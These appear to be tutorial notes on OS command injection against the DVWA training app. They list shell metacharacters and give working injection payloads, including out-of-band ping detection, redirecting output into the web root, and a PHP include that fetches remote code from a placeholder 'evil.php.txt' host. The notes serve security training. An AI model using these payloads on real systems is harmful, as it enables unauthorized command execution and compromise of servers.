
# Command Injection

Magic characters are (some of them):
        
    &		start command directly, don't wait for first command to finish (can cause race conditions)
    &&		start command after first but only if first was successful
    ;		start command after first command finished
    |		start command after first finished and hand over result output from first to second command (pipe)
    ||		start command after first but only if first failed
    -		can be used to add parameters to the initial command (e.g. often -V, -v or --version to display the version of the program)
    $		reference variables (e.g. echo $HOME == "/root"
    $()		invoke a command and use the result right here (e.g. echo "whoami" == "whoami", echo $(whoami) == "roor")
    ``		invoke a command, same as with $()
    >		pipe output into a file (or file descriptor like stdout &1, stderr &2 and stdin &0
    <		same as > only in the other direction
    <<<		same as < but instead of passing files, a string is passed (e.g. cat < /etc/passwd prints the content of /etc/passwd whereas cat <<< /etc/passwd just prints "/etc/passwd".
    0,1,2	File descriptios for /dev/stdin (0), /dev/stdout (1) and /dev/stderr (2), can be used with `n>` and `<&n` to pipe from std* to something or `>&n` to pipe from something to std*
                $ echo hi > result.txt			# pipe result from echo command (which goes to stdout) into result file
                $ echo hi | command				# pipe result from echo command to stdin of next command using pipe (|)
                $ cat <result.txt				# pipe contents of result file to stdin or cat command (which will return the result to stdout)
                $ echo hi | cat -				# pipe echo to next command and use cat to display the contents of /dev/stdin (-)
                $ echo hi | cat &0				# same as before only using the file descriptor &0 instead of - for stdin
                $ echo hi | cat </dev/stdin		# same as before only using < to pipe the contents of /dev/stdin to the stdin of cat
                $ apt > apt						# run apt (will print help to stdout) and pipe output (stdout) to file
                $ apt 1> apt					# run apt (will print help to stdout) and pipe output (stdout) to file
                $ dpkg 2> dpkg					# run dpkg (will print help to stderr) and pipe stderr output to file
                $ dpkg | grep dpkg				# run dpkg and pipe output (stdout) to next command (grep will not show any results but stderr is still shown fully)
                $ dpkg 2>| grep dpkg			# run dpkg and pipe output (stderr) to next command (grep will show results containing "dpkg", stderr is not shown fully)
                $ dokg 2>&1 | grep dpkg			# run dpkg, merge stderr (2>) with stdout (&1) and pipe it all to next command.


Also have a look at these characters to try and find a way to exploit potential CMDi vulnerabilities

    Windows: ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . ” % @ / \ : + , `
    Linux: { }  ( ) < > & * ‘ | = ? ; [ ]  $ – # ~ ! . ” %  / \ : + , ` 

Read for additional info: https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
    
## dvwa low

	# get version of installed ping command
	127.0.0.1 -V
	ping utility, iputils-s20161105
	
	# execute command  (successfully)
	127.0.0.1 & whoami							# direct output of both commands in web interface (whoami first, since faster)
	127.0.0.1 && whoami							# direct output of both commands in web interface (whoami last, waiting for ping to be successful)
	127.0.0.1; whoami							# direct output of both commands in web interface (whoami last, waiting for ping to finish)
	127.0.0.1 | whoami 							# direct output of whoami command in web interface (ping output is thrown away)
	1 || whoami > /var/www/dvwa/cmd.html		# no direct output since ping fails, therefore redirect to file is required to read result
	127.0.0.1 -V								# doesn't add other commands but prints ping utility version instead of ping result
	.$HOME -v 2>/var/www/dvwa/cmd.html			# should work with any variable (check env for names), prepending . helps, -v necessary for debug, 2 > file pipes stderr to file (debug) instead of stdout (empty)
												# /var/www/dvwa/cmd.html => "ping: socket: Permission denied, attempting raw socket... ping: ./var/www/dvwa/vulnerabilities/exec: Name or service not known "
	.$(whoami) -v 2>/var/www/dvwa/cmd.html		# same as with variable but command result is printed in error log instead.
	.`whoami` -v 2>/var/www/dvwa/cmd.html		# same as with $(), this is not the only use case but in dvwa, errors are not displayed so this is a nice way to still see the result.
	
Another way to test \`\` and `$()` is by requesting external resources, like this:

	command: ping -c 4 $input
	input: 127.0.0.1 $(ping -c 1 my-server-ip)
	server: run "tcpdump icmp" on the server you are pinging and check if  you are receiving a single ping from the target.
	
	example: Even though the web interface doesn't display anything, we still receive a ping request. Therefore, executing commands is possible. (Try the same with `` instead of $())
	input: $(ping -c 1 10.10.10.5) 127.0.0.1
	server: tcpdump icmp -i eth1
	tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
	listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
	16:20:26.268347 IP kundensystem.com > kali-vm: ICMP echo request, id 2545, seq 1, length 64
	16:20:26.268374 IP kali-vm > kundensystem.com: ICMP echo reply, id 2545, seq 1, length 64

## dvwa medium

Check the examples above and see which ones still work. There should be two that are gone.

	127.0.0.1; whoami			# not working anymore, ";" is filtered out
	127.0.0.1 && whoami			# not working anymore, "&&" is filtered out

## dvwa high

In high, dvwa is filtering out quite a few commands but it is still possible to exploit it. There are two ways to figure this out. Either repeat all the possible options (again) or look at the source code. 
Either way, try to figure out which one still works.

## extra: php code injection (`shell_exec` -> run system code)
This works in general but has the problem in dvwa high, that parantheses are removed. So we need to find a way to execute commands without using `()`.

	ping -c 1 '<?php shell_exec("whoami")?>' 2>/var/www/dvwa/test.php
	
We can try using [language constructs](http://solidlystated.com/scripting/php-functions-without-parentheses/) instead of functions, as they work without the use of `()`.

	# injecting a php command with the "echo" construct
	ping -c 1 '<?php echo "test"?>' 2>/var/www/dvwa/test.php
	
	# injecting a php command with the "include" construct (requires 'allow_url_include' to be set)
	ping -c 1 '<?php include "http://remove.server.tld/evil.php.txt"?>' 2>/var/www/dvwa/test.php


	

